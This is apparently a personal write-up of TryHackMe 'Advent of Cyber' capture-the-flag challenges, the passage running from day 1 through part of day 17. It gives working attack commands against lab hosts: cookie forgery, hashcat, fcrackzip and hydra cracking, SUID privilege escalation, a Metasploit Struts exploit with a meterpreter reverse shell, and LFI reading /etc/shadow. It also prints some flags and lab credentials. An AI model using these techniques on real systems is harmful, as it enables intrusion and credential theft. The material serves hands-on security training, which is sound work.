# Day1 Inventory Management 
```
Elves needed a way to submit their inventory - have a web page where they submit their requests and the elf mcinventory can look at what others have submitted to approve their requests. It’s a busy time for mcinventory as elves are starting to put in their orders. mcinventory rushes into McElferson’s office.


I don’t know what to do. We need to get inventory going. Elves can log on but I can’t actually authorise people’s requests! How will the rest start manufacturing what they want.  

McElferson calls you to take a look at the website to see if there’s anything you can do to help. Deploy the machine and access the website at http://<your_machines_ip>:3000 - it can take up to 3 minutes for your machine to boot!
```
## 1. What is the name of the cookie used for authentication?
   - creted id h4ck pass: password email: lovyou@test.com
   - cookie: authid: aDRja3Y0ZXI5bGwxIXNz
## 2. If you decode the cookie, what is the value of the fixed part of the cookie?
the cookie is encoded with base64,to decode it run:
```console
kali@kali:~$ echo "aDRja3Y0ZXI5bGwxIXNz" | base64 -d
h4ckv4er9ll1!ss
```
flag: ```v4er9ll1!ss```
## 3. After accessing his account, what did the user mcinventory request?
we know that the username that we try to gain access = mcinventory so we need to add the prefix part -> ```mcinventoryv4er9ll1!ss```
the cookie is encoded with base64, to encode it run:
```console
kali@kali:~$ echo "mcinventoryv4er9ll1!ss" |base64 
bWNpbnZlbnRvcnl2NGVyOWxsMSFzcw==
```
now we need to change = to %3D which give us -> ```bWNpbnZlbnRvcnl2NGVyOWxsMSFzcw%3D%3D```
flag:```firewall```

# Day 2: Arctic Forum 
```
A big part of working at the best festival company is the social live! The elves have always loved interacting with everyone. Unfortunately, the christmas monster took down their main form of communication - the arctic forum! 

Elf McForum has been sobbing away McElferson's office. How could the monster take down the forum! In an attempt to make McElferson happy, she sends you to McForum's office to help. 

P.S. Challenge may a take up to 5 minutes to boot up and configure!

Access the page at http://[your-ip-here]:3000
```
## What is the path of the hidden page?
use DirBuster to bruteforce directory
```console
$dirbuster& # use wordlist inside /usr/share/wordlists/
```
## What is the password you found?
```html
<h1> Admin Login </h1>
      
          <div class="alert alert-info">Login Failed</div>
      
        <form method="post" action="/sysadmin">
            <div class="form-group">
                <label for="item">Email</label>
                <input type="text" class="form-control" id="username" name="username">
            </div>
            <div class="form-group">
                <label for="item">Password</label>
                <input type="password" class="form-control" id="password" name="password">
            </div>
            <button type="submit" class="btn btn-default">Submit</button>
        </form>
    </div>
    <!--
    Admin portal created by arctic digital design - check out our github repo
    -->
```
check the [github](https://github.com/ashu-savani/arctic-digital-design)
## What do you have to take to the 'partay'
just login to the page using the cerdential we got for github, read and you will find out

# Day 3 Evil Elf
```
An Elf-ministrator, has a network capture file from a computer and needs help to figure out what went on! Are you able to help?

Supporting material for the challenge can be found here!
```
## Whats the destination IP on packet number 998?
Open the pcap with wireshark. select Go -> Go to packet
[link](https://www.wireshark.org/docs/wsug_html_chunked/ChWorkGoToPacketSection.html)

## What item is on the Christmas list?
right click on packet number 998 -> follow -> tcp stream: here is what you will find out
```console
echo 'XXX' > christmas_list.txt
```
```XXX``` is the answer to this question
## Crack buddy's password!
to understand the structure of /etc/shadow read [link](https://linuxize.com/post/etc-shadow-file/)
```buddy:$6$3GvJsNPG$ZrSFprHS13divBhlaKg1rYrYLJ7m1xsYRKxlLh0A1sUc/6SUd7UvekBOtSnSyBwk3vCDqBhrgxQpkdsNN6aYP1:18233:0:99999:7:::```
from the link you will know that $6$ = SHA-512

at the begining I wanted to use john to crack the password but it seeam like john is not working with showdow file... you need to unshadow it first. To be able to unshadow it, you need the passwd + shadow files. 

So after a bit of reasearching. HashCat seem like is the best option for this task [link](https://hkh4cks.com/blog/2018/02/05/password-cracking-tools/#hashcat). LETs do it
```console
kali@kali:~$ nano hash.lst # add the buddy hashed password
kali@kali:~$ cat hash.lst 
buddy:$6$3GvJsNPG$ZrSFprHS13divBhlaKg1rYrYLJ7m1xsYRKxlLh0A1sUc/6SUd7UvekBOtSnSyBwk3vCDqBhrgxQpkdsNN6aYP1:18233:0:99999:7:::
kali@kali:~$ hashcat -m 1800 -a 0 -o buddy.txt hash.lst /usr/share/wordlists/rockyou.txt --force
kali@kali:~$ cat buddy.txt 
$6$3GvJsNPG$ZrSFprHS13divBhlaKg1rYrYLJ7m1xsYRKxlLh0A1sUc/6SUd7UvekBOtSnSyBwk3vCDqBhrgxQpkdsNN6aYP1:XXXXXXX
```
find out what ```XXXXXXX``` is. GL

# Day 4: Training 
```
With the entire incident, McElferson has been very stressed.

We need all hands on deck now

To help resolve things faster, she has asked you to help the new intern(mcsysadmin) get familiar with Linux. 
Access the machine via SSH on port 22 using the command

ssh mcsysadmin@[your-machines-ip]

username: mcsysadmin
password: bestelf1234
```

```console
$ ls | wc -l #1
$ cat file5 #2
$ grep -lR "password" #3
$ grep -lRE "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" # find the file that contain ip address
$ grep -E "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" fileX #4
$ cat /etc/passwd | grep "/bin/bash" | wc -l #5
$ openssl sha1 file8 #6
$ find / -name "*shadow*" > shadow.txt # find all file name shadow and output it as a shadow.txt
$ cat shadow.txt # and look for the file
$ cat xxx/xxxx.bak # GL fild out what xxx is
```
useful link
1. [regex ip](https://www.putorius.net/grep-an-ip-address-from-a-file.html)

# Day 5: Ho-Ho-Hosint 
```
Elf Lola is an elf-of-interest. Has she been helping the Christmas Monster? lets use all available data to find more information about her! We must protect The Best Festival Company!
```

## What is Lola's date of birth? Format: Month Date, Year(e.g November 12, 2019)
A tool call ```exiftool``` can be used to examining img meta data. to install it run ```sudo apt install libimage-exiftool-perl```
```console
kali@kali:~$ exiftool Desktop/thegrinch.jpg 
ExifTool Version Number         : 11.94
File Name                       : thegrinch.jpg
Directory                       : Desktop
File Size                       : 69 kB
File Modification Date/Time     : 2020:05:04 20:05:29-04:00
File Access Date/Time           : 2020:05:04 20:05:29-04:00
File Inode Change Date/Time     : 2020:05:04 20:05:29-04:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
XMP Toolkit                     : Image::ExifTool 10.10
Creator                         : JLolax1
Image Width                     : 642
Image Height                    : 429
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 642x429
Megapixels                      : 0.275
```
after googling ```JLolax1``` you will find her twitter. You will find her date of birth there.

## What is Lola's current occupation?
occupation = job or profession, lol new word everyday.
You can find the answer on her twitter.

## What phone does Lola make?
check her twitter
## What date did Lola first start her photography? Format: dd/mm/yyyy
In her twitter you will find her web page. To be able to know when she started wiht her hobby we need to get old information/snapshot of her webpage. To do that we need to use [WayBackMachine](https://archive.org/web/). The ```WayBackMachine``` is a digital archive of the World Wide Web. It takes a snapshot of a website and saves it for us to view in the future


You can find the anwer in the fist snapshot of her webpage on https://archive.org/web/. GL
## What famous woman does Lola have on her web page?
save the picture and use the image serach function on https://www.google.com/imghp?hl=en

# Day 6: Data Elf-iltration 
```
"McElferson! McElferson! Come quickly!" yelled Elf-ministrator.

"What is it Elf-ministrator?" McElferson replies.

"Data has been stolen off of our servers!" Elf-ministrator says!

"What was stolen?" She replied.

"I... I'm not sure... They hid it very well, all I know is something is missing" they replied.

"I know just who to call" said McElferson...
```
LEARN [here](https://docs.google.com/document/d/17vU134ZfKiiE-DgiynrO0MySo4_VCGCpw2YJV_Kp3Pk/edit)
## What data was exfiltrated via DNS? 
open the .pcap with wireshark. search for ```UDP``` packet. you will find some udp packet that has some weird HEXdump. Right click on it and select **follow udp flow**. Copy the hexdump and use ```xxd``` get the plain text.
```console
kali@kali:~$ echo "43616e64792043616e652053657269616c204e756d6265722038343931" | xxd -r -p
```
## What did Little Timmy want to be for Christmas?
We learn that you can export http ocject from wirshark. do that! you will. to solve this task, we unzip ```christmaslists.zip```. The file is encrypted. To crack the .zip, we need a tool call 
```console
kali@kali:~$ sudo apt-get install fcrackzip
kali@kali:~$ fcrackzip -b --method 2 -D -p /usr/share/wordlists/rockyou.txt -v Downloads/Day6/christmaslists.zip
```
-b specifies brute forcing, --method 2 specifies a Zip file, -D specifies a Dictionary and -V verifies the password is indeed correct


After you get the password
```console
kali@kali:~$ cd Downloads/Day6/
kali@kali:~/Downloads/Day6$ sudo unzip -P december christmaslists.zip 
Archive:  christmaslists.zip
 extracting: christmaslistdan.tx    
  inflating: christmaslistdark.txt   
  inflating: christmaslistskidyandashu.txt  
  inflating: christmaslisttimmy.txt
kali@kali:~/Downloads/Day6$ cat christmaslisttimmy.txt 
```
## What was hidden within the file?
```console
kali@kali:~$ steghide extract -sf Downloads/Day6/TryHackMe.jpg 
Enter passphrase: 
steghide: did not write to file "christmasmonster.txt".
kali@kali:~$ cat christmasmonster.txt
```
some cool stuff I learn on the side, check out [here](https://en.wikipedia.org/wiki/April_Fools%27_Day_Request_for_Comments) and [here](https://tools.ietf.org/html/rfc527)

# Day 7: Skilling Up
```
Previously, we saw mcsysadmin learning the basics of Linux. With the on-going crisis, McElferson has been very impressed and is looking to push mcsysadmin to the security team. One of the first things they have to do is look at some strange machines that they found on their network. 
```
## how many TCP ports under 1000 are open?
```sudo nmap -sS 10.10.37.120```
## What is the name of the OS of the host?
```sudo nmap -O 10.10.37.120```
## What version of SSH is running?
```sudo nmap -sV -p 22 10.10.37.120```
## What is the name of the file that is accessible on the server you found running?
use nmap to scan all port, you will find the answer on port which run http. GL

# Day 8: SUID Shenanigans
```
Elf Holly is suspicious of Elf-ministrator and wants to get onto the root account of a server he setup to see what files are on his account. The problem is, Holly is a low-privileged user.. can you escalate her privileges and hack your way into the root account?

Deploy and SSH into the machine.
Username: holly
Password: tuD@4vt0G*TU

SSH is not running on the standard port.. You might need to nmap scan the machine to find which port SSH is running on.
nmap <machine_ip> -p <start_port>-<end_port>
```
this one sound FUN !!
READ this [link](https://blog.tryhackme.com/linux-privilege-escalation-suid/)

## What port is SSH running on?
```console
$ sudo nmap -sS -p- 10.10.228.120 # scan all port
$ sudo nmap -sV -p XXX  10.10.228.120 # scan service on specific port
```
## Find and run a file as igor. Read the file /home/igor/flag1.txt
```console
$ ssh holly@ip -p <port> # ssh to the target
$ find / -perm -4000 -exec ls -ldb {} \; > allsuid.txt # find all suid on the machine and output it in a file
$ cat allsuid.txt | grep "igor" # find the suid for Igor 
-rwsr-xr-x 1 igor igor 221768 Feb  7  2016 /usr/bin/find
-rwsr-xr-x 1 igor igor 2770528 Mar 31  2016 /usr/bin/nmap
$ find /home/igor/flag1.txt -XXXX XXX {} \; # now use find to cat the 
```
find out what ```-XXXX XXX``` and you will get the answer.

## Find another binary file that has the SUID bit set. Using this file, can you become the root user and read the /root/flag2.txt file?
I just gonna give a hint here.
```console
cat allsuid.txt | grep "root" 
```
here you will find a werid program in bin that you can run as a root user. by weird means, it is not a normalt program that every linux have and there is no man page for that program when you google it. The program will let you execute a command as a root. GL !!

# Day 9: Requests
```
McSkidy has been going keeping inventory of all the infrastructure but he finds a random web server running on port 3000. All he receives when accessing '/' is

```{"value":"s","next":"f"}```


McSkidy needs to access the next page at /f(which is the value received from the data above) and keep track of the value at each step(in this case 's'). McSkidy needs to do this until the 'value' and 'next' data have the value equal to 'end'.

You can access the machines at the following IP:

    10.10.169.100

Things to note about this challenge:

    The JSON object retrieved will need to be converted from unicode to ASCII(as shown in the supporting material)
    All the values retrieved until the 'end' will be the flag(end is not included in the flag)
```
Read [here](https://docs.google.com/document/d/1FyAnxlQpzh0Cy17cKLsUZYCYqUA3eHu2hm0snilaPL0/edit)

```python
# made by gu2rks@github
import requests
r = requests.get("http://10.10.169.100:3000")
r = r.json()
# {"value":"s","next":"f"}
flag = r["value"]
while True:
    r = requests.get("http://10.10.169.100:3000/"+str(r["next"]))
    r = r.json()
    if r["next"] == "end":
        break
    flag = flag + r["value"]

print("the flag: "+ flag)
```
# Day 10: 


me: 10.8.14.151
target: 10.10.87.246

nmap
```
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-07 22:38 EDT
[*] Nmap: Nmap scan report for 10.10.87.246
[*] Nmap: Host is up (0.048s latency).
[*] Nmap: Not shown: 997 closed ports
[*] Nmap: PORT    STATE SERVICE VERSION
[*] Nmap: 22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
[*] Nmap: 80/tcp  open  http    Apache Tomcat/Coyote JSP engine 1.1
[*] Nmap: 111/tcp open  rpcbind 2-4 (RPC #100000)
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 8.04 seconds
```
## Compromise the web server using Metasploit. What is flag1?
web url = http://10.10.87.246/showcase.action
port80
```console
msf5 post(multi/gather/tomcat_gather) > db_nmap -p 80 -A 10.10.87.246
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-07 23:07 EDT
[*] Nmap: Nmap scan report for 10.10.87.246
[*] Nmap: Host is up (0.052s latency).
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 80/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
[*] Nmap: |_http-server-header: Apache-Coyote/1.1
[*] Nmap: | http-title: Santa Naughty and Nice Tracker
[*] Nmap: |_Requested resource was showcase.action
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 27.74 seconds
```
nikto use for scan web app vuln
```console
kali@kali:~$ nikto -host 10.10.87.246
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.87.246
+ Target Hostname:    10.10.87.246
+ Target Port:        80
+ Start Time:         2020-05-07 23:05:40 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Root page / redirects to: showcase.action
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Uncommon header 'nikto-added-cve-2017-5638' found, with contents: 42
+ /index.action: Site appears vulnerable to the 'strutshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638).
me: 10.8.14.151
```
As you can se the site is vulnerble to [strutshock](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638)
```console
$ set LHOST <my ip> # set for reverse
$ search strut # search for vuln
$ use 2 # slect vuln
$ set payload linux/x86/meterpreter/reverse_tcp
$ set RHOST <target>
$ set RPOTY <80>
$ set TARGETURL /showcase.action
$ exploit
```
The flag file is call xxxxxFlag1.txt. Good luck finding it. hint ```find / 2>>/dev/null | grep -i "flag"```

## Now you've compromised the web server, get onto the main system. What is Santa's SSH password?
```/home/santa/ssh-creds.txt``` 

## Who is on line 148 of the naughty list?
```console

      \         /   \         /   \         /   \         /
      _\/     \/_   _\/     \/_   _\/     \/_   _\/     \/_
       _\-'"'-/_     _\-'"'-/_     _\-'"'-/_     _\-'"'-/_
      (_,     ,_)   (_,     ,_)   (_,     ,_)   (_,     ,_)
        | ^ ^ |       | o o |       | a a |       | 6 6 |
        |     |       |     |       |     |       |     |
        |     |       |     |       |     |       |     |
        |  Y  |       |  @  |       |  O  |       |  V  |
        `._|_.'       `._|_.'       `._|_.'       `._|_.'
         Dasher        Dancer       Prancer        Vixen
      \         /   \         /   \         /   \         /
      _\/     \/_   _\/     \/_   _\/     \/_   _\/     \/_
       _\-'"'-/_     _\-'"'-/_     _\-'"'-/_     _\-'"'-/_
      (_,     ,_)   (_,     ,_)   (_,     ,_)   (_,     ,_)
        | q p |       | @ @ |       | 9 9 |       | d b |
        |     |       |     |       |     |       |     |
        |     |       |     |       |  _  |       |     |
        | \_/ |       |  V  |       | (_) |       |  0  |
        `._|_.'       `._|_.'       `._|_.'       `._|_.'
         Comet         Cupid         Donder       Blitzen
                           \         /
                           _\/     \/_
                            _\-'"'-/_
                           (_,     ,_)
                             | e e |
                             |     |
                        '-.  |  _  |  .-'
                       --=   |((@))|   =--
                        .-'  `._|_.'  '-.
                             Rudolph
```
so cute
```console
[santa@ip-10-10-166-181 ~]$ ls
naughty_list.txt  nice_list.txt
[santa@ip-10-10-166-181 ~]$ cat -n naughty_list.txt | grep XXX
```
find out what XXX is GL
## Who is on line 52 of the nice list?
```cat -n nice_list.txt | grep XX```
GL
# Elf Applications 
```
McSkidy has been happy with the progress they've been making, but there's still so much to do. One of their main servers has some integral services running, but they can't access these services. Did the Christmas Monster lock them out? 

Deploy the machine and starting scanning the IP. The machine may take a few minutes to boot up.
```
READ [this](https://docs.google.com/document/d/1qCMuPwBR0gWIDfk_PXt0Jr220JIJAQ-N4foDZDVX59U/edit#)
## What is the password inside the creds.txt file?
```console
kali@kali:~$ mkdir Day10NFS
kali@kali:~$ sudo mount -t nfs 10.10.86.177:/ Day10NFS/
kali@kali:~$ cd Day10NFS/opt/files/
kali@kali:~/Day10NFS/opt/files$ cat creds.txt
```
## What is the name of the file running on port 21?
btw you need to be a root to get the file otherwirse it you will keep geting permission deniend 
```console
$ ftp 10.10.86.177 # username anonymous password anonymous
ftp> ls
ftp> binary
ftp> get <thefile>
ftp> exit
$ cat <thefile>
remember to wipe mysql:
root
ff912ABD*
```
## What is the password after enumerating the database?
we got mysql cerdential from the last task. find out more about mysql command click [link](https://gist.github.com/hofmannsven/9164408)
```mysql -h 10.10.86.177 -u root -p``` connect to mysql server. To complete this task use following cmd
```mysql
show databases;
use [database];
show tables;
SELECT * FROM [table];
```
GL

# Day 12 :  Elfcryption 
```
You think the Christmas Monster is intercepting and reading your messages! Elf Alice has sent you an encrypted message. Its your job to go and decrypt it!
```
READ [this](https://docs.google.com/document/d/1xUOtEZOTS_L8u_S5Fbs1Wof7mdpWQrj2NkgWLV9tqns/edit)
## What is the md5 hashsum of the encrypted note1 file?
```console
$ md5sum note1.txt.gpg # check sum
```

## Where was elf Bob told to meet Alice?
```console
$ gpg -d --batch --passphrase 25daysofchristmas note1.txt.gpg
```

## Decrypt note2 and obtain the flag!
```console
$ openssl rsautl -decrypt -inkey private.key -in note2_encrypted.txt -out note2.txt
$ cat not2.txt
```

# Day 13 : Accumulate
```
mcsysadmin has been super excited with their new security role, but wants to learn even more. In an attempt to show their l33t skills, they have found a new box to play with. 

This challenge accumulates all the things you've learnt from the previous challenges(that being said, it may be a little more difficult than the previous challenges). Here's the general way to attempt exploitation when just given an IP address:

1. Start out with an NMAP scan to see what services are running
2. Enumerate these services and try exploit them
3. use these exploited services to get an initial access to the host machine
4. enumerate the host machine to elevate privileges

```console
kali@kali:~$ nmap -Pn -A 10.10.182.103
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 23:22 EDT
Nmap scan report for 10.10.182.103
Host is up (0.048s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2020-05-12T03:23:07+00:00
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2020-05-11T02:55:18
|_Not valid after:  2020-11-10T02:55:18
|_ssl-date: 2020-05-12T03:23:08+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.72 seconds
```
## A web server is running on the target. What is the hidden directory which the website lives on?
```
kali@kali:~$ nmap -Pn 10.10.182.103 # -pn treat the target like it is up, seem like it block icmp
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 23:19 EDT
Nmap scan report for 10.10.182.103
Host is up (0.051s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
kali@kali:~$dirbuster& #use wordlist dirbuster2.3 medium
```
you will find you answer by runing the dirbuster.
## Gain initial access and read the contents of user.txt
check all Wade's posts here ```retro/index.php/author/wade/```you will find some vulable info.
hint: you can find the password in a comment -> log in to the page.
if you can log in to the wordpress dashboard page then use the same cerdential and RDP to the server. parzival
## [Optional] Elevate privileges and read the content of root.txt
I saw that we have chrome installed. In bookmark you will see this https://nvd.nist.gov/vuln/detail/CVE-2019-1388.
I saw that there is something in recycle bin, a .exe
After some reseacrh, I found this [writup](https://www.embeddedhacker.com/2019/12/hacking-walkthrough-thm-cyber-of-advent/#day10), and he mention this [gif](https://raw.githubusercontent.com/jas502n/CVE-2019-1388/master/CVE-2019-1388.gif). Follow this and you will be able to get root. MAKE SURE that you use **IE** when open the certificate, I got some eror and needed to restart the whole machine


when you are done that, look around and try to find root.txt. HINT: in ```C:\Users\Admin```
# Day 14 : Unknown Storage 
```
McElferson opens today's news paper and see's the headline

Private information leaked from the best festival company

This shocks her! She calls in her lead security consultant to find out more information about this. How do we not know about our own s3 bucket. 

McSkidy's only starting point is a single bucket name: advent-bucket-one
```
READ [this](https://docs.google.com/document/d/13uHBw3L9wdDAFboErSq_QV8omb3yCol0doo6uMGzJWo/edit#). one of the most easy tasks read it and you will able to solve it
## What is the name of the file you found?
```http://advent-bucket-one.s3.amazonaws.com/```
## What is in the file?
```http://advent-bucket-one.s3.amazonaws.com/somethinghere```
what should in be in "somethinghere"?
# Day 15 : LFI 
```
Elf Charlie likes to make notes and store them on his server. Are you able to take advantage of this functionality and crack his password? 
```
READ [this](https://blog.tryhackme.com/lfi/)

```console
kali@kali:~$ sudo nmap -A 10.10.21.94
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-12 22:55 EDT
Nmap scan report for 10.10.21.94
Host is up (0.050s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 55:02:84:a1:da:8d:f2:c9:fd:ea:65:56:fe:6a:a6:89 (RSA)
|   256 94:ad:1f:6a:ee:f4:bf:56:7e:6c:ba:1e:d2:92:ec:e6 (ECDSA)
|_  256 c1:5d:32:10:dd:5b:01:25:dd:6b:f4:b5:52:10:c7:29 (ED25519)
80/tcp open  http    Node.js (Express middleware)
|_http-title: Public Notes
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=5/12%OT=22%CT=1%CU=33422%PV=Y%DS=2%DC=T%G=Y%TM=5EBB61C
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=106%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST1
OS:1NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   50.36 ms 10.8.0.1
2   49.57 ms 10.10.21.94
```
```js
<script>
      function getNote(note, id) {
        const url = '/get-file/' + note.replace(/\//g, '%2f')
        $.getJSON(url,  function(data) {
          document.querySelector(id).innerHTML = data.info.replace(/(?:\r\n|\r|\n)/g, '<br>');
        })
      }
      // getNote('server.js', '#note-1')
      getNote('views/notes/note1.txt', '#note-1')
      getNote('views/notes/note2.txt', '#note-2')
      getNote('views/notes/note3.txt', '#note-3')
</script>
```

## What is Charlie going to book a holiday to?
http://10.10.21.94/get-file/views%2Fnotes%2Fnote3.txt or just read the page

## Read /etc/shadow and crack Charlies password.
```/etc``` is at the root directory. and we are currently at ```...../get-file/....```. To move back to root terminal we need to do ``cd ..`` multiple times. So my plan is just spam ```..%2F``` like 10 time to make sure that it will end up at the root directory.


this give us ````10.10.21.94/get-file/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow```

now use hashcat
```console
kali@kali:~$ mkdir Day15 && cd Day15
kali@kali:~/Day15$ nano charlie.lst # add the hash
kali@kali:~/Day15$ hashcat -m 1800 -a 0 -o charlie.txt charlie.lst /usr/share/wordlists/rockyou.txt --force
kali@kali:~/Day15$ cat charlie.txt
```
## What is flag1.txt?
just SSH using charlie cerdential and grep the flag1.txt!!
```console
kali@kali:~/Day15$ ssh charlie@10.10.21.94
charlie@ip-10-10-21-94:~$ ls
flag1.txt
charlie@ip-10-10-21-94:~$ cat flag1.txt 
THM{4ea2adf842713ad3ce0c1f05ef12256d}
```

# Day 16 : File Confusion 
```
The Christmas monster got access to some files and made a lot of weird changes. Can you help fix these changes?

Use a (python) script to do the following:
1. extract all the files in the archives 
2. extract metadata from the files 
3. extract text from the files
```
READ [this](https://docs.google.com/document/d/13eYEcqpyp3fIAnaDR8PHz6qibBJJwf2Vp5M77KkEKtw/edit#)

## How many files did you extract(excluding all the .zip files)
```python
""" 
How many files did you extract(excluding all the .zip files)
"""
# get all files
files = os.listdir('./final-final-compressed')
for file in files:
    # now unzip it
    with zipfile.ZipFile('./final-final-compressed/'+file, 'r') as zip_ref:
        zip_ref.extractall('./extracted')
# get all files agains
extracted = os.listdir('./extracted')
print('Extracted %s files' % len(extracted))
```

## How many files contain Version: 1.1 in their metadata?
```python
""" 
How many files contain Version: 1.1 in their metadata?
Note: move this scrip inside ./extracted
lookingfor = {'SourceFile': '4jGg.txt', 'ExifTool:ExifToolVersion': 11.94, 'File:FileName': '4jGg.txt',
'File:Directory': '.', 'File:FileSize': 2844, 'File:FileModifyDate': '2020:05:13 22:02:50-04:00', 
'File:FileAccessDate': '2020:05:13 22:39:53-04:00', 'File:FileInodeChangeDate': '2020:05:13 22:02:50-04:00', 
'File:FilePermissions': 644, 'File:FileType': 'MIE', 'File:FileTypeExtension': 'MIE', 'File:MIMEType': 'application/x-mie', 
'XMP:XMPToolkit': 'Image::ExifTool 10.80', 'XMP:Version': 1.1}
"""
count = 0
files = os.listdir('./') # get all files

with exiftool.ExifTool() as et: # get exiftool
    files_metadata = et.get_metadata_batch(files) # get all files metadata
for metadata in files_metadata: # get file metadata one by one
    if 'XMP:Version' in metadata: # check if metadata contains 'XMP:Version'
        count = count + 1 # if so -> count it

print('Total Version:1.1 files : %s' %count) 
```

## Which file contains the password?
```python
"""
Which file contains the password?
Note: move this scrip inside ./extracted
password is 'scriptingpass'
"""
files = os.listdir('./') # get all files
for file in files: # get file name one by one
    with open(file, 'r', encoding = "ISO-8859-1") as reader: # open it
        data = reader.read() # read it
    if 'password' in data: # check if it contain password
        print(file) # if so -> print out file name
```

# Day 17 : Hydra-ha-ha-haa 
```
You suspect Elf Molly is communicating with the Christmas Monster. Compromise her accounts by brute forcing them!
```
READ [this](https://blog.tryhackme.com/hydra/)

```console
kali@kali:~$ nmap -p- -A 10.10.14.193                                                              
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-14 22:11 EDT                                    
Nmap scan report for 10.10.14.193                                                                  
Host is up (0.059s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:9a:04:86:5b:8c:91:ec:c7:a2:1c:98:91:ad:29:8b (RSA)
|   256 7b:05:37:61:84:83:ad:ab:2e:fc:98:ad:96:a2:36:66 (ECDSA)
|_  256 84:ec:f1:4a:ba:ab:b1:8b:ed:1a:31:58:f0:82:67:0e (ED25519)
80/tcp open  http    Node.js Express framework
| http-title: Christmas Challenge
|_Requested resource was /login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Use Hydra to bruteforce molly's web password. What is flag 1? (The flag is mistyped, its THM, not TMH)
```console
kali@kali:~$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.14.193 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect."
```

## Use Hydra to bruteforce molly's SSH password. What is flag 2?
```console
kali@kali:~$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.14.193 -t 4 ssh
Hydra v9.1-dev (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-14 22:18:51
